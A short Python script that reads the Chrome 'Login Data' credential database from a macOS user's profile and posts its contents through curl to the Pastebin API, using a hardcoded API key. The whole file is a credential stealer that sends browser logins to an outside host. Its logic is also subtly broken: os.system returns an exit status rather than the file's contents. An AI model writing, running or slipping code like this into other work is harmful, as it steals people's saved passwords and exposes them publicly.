import os
import string


api_key = 'O_2qxY3B3XiBirO_GnZVlSDCLqutwyBH'
data = os.system('cd && cd ~/Library/Application\\ Support/Google/Chrome/Default/ && cat Login\\ Data')
os.system(f'curl -X POST -d \'api_dev_key={api_key}\' -d \'api_paste_code={data}\' -d \'api_option=paste\' \"https://pastebin.com/api/api_post.php\"')
